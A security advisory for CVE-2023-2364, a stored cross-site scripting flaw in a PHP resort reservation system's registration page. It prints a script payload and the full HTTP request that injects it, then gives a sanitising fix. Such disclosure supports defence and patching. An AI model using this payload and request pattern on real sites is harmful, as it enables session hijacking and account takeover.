# Resort Reservation System - Stored Cross Site Scripting on Registration Page could allow to hijack admin session

### Date: 
> 26 April 2023

### CVE Assigned:
**[CVE-2023-2364](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2364)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2023-2364) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2023-2364)

### Author Email: 
> navaidnasari@hotmail.co.uk

### Vendor Homepage:
> https://www.sourcecodester.com

### Software Link:
> [Resort Reservation System](https://www.sourcecodester.com/php/16447/resort-reservation-system-php-and-sqlite3-source-code-free-download.html)

### Version:
> v 1.0

### What is Stored Cross-Site Scripting:
> Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

### Affected Page: 
> Vulnerable Page: unvalidated data submitted through registration.php and reflected on users.php

> In this page order parameter is vulnerable to Reflected Cross Site Scripting Attack

### Description:
> The Stored XSS found in registration page and without unauthentication any malicious user could inject the Cross-Site Scripting (XSS) to hijack the admin session, it is a serious vulnerability that can have a significant impact on the security of a web application and its users. The main risk associated with Unauthenticated Stored XSS is that it can allow an attacker to steal sensitive information or take control of a admin's account on a web application. This can include login credentials, financial information, personal information, and more. Once an attacker gains access to a admin's account, they can perform any actions that the user is authorized to do. In addition, Unauthenticated Stored XSS can also be used as a stepping stone to launch more advanced attacks, such as phishing attacks, malware distribution, or distributed denial-of-service attacks. By gaining control of a admin's account on a web application, an attacker can use that account as a launching point for further attacks against the user or the web application itself.

### Proof of Concept:
> I registered the dummy user to verify the XSS attack, I used standard XSS payload <script>alert(document.cookie);</script> and the Below Image confirmed that, the parameter is vulnerable to stored XSS.

> Payload: <script>alert(document.cookie);</script>

> Request: 
```
POST /php-sqlite-rrs/LoginRegistration.php?a=register_user HTTP/1.1
Host: localhost
Content-Length: 172
sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/php-sqlite-rrs/registration.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=d723dc8984528029f975c705200f3499
Connection: close

formToken=%242y%2410%24xOJNdT6NDl5IbdjSWkqQzOPga1ppXRtqP9BiJHvMCnnSWkh97G7w.&fullname=%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E&username=xsstest&password=xsstest
```

> and when we logged in through admin account we got an alert with cookie.
![image](https://user-images.githubusercontent.com/123810418/234568385-44cb7966-5e4a-4c7a-8d48-a9c87b117c87.png)


### Recommendation: 
> Whoever uses this CMS, should update line no 40 and 41 of users.php with the following code to avoid cross-site scripting attack:
```
Old Code: <?php echo $_GET['fullname']; ?> and <?php echo $_GET['username']; ?>
New Code: <?php echo htmlspecialchars(strip_tags($_GET['fullname'])); ?> and <?php echo htmlspecialchars(strip_tags($_GET['username'])); ?>
```

Thank you for reading
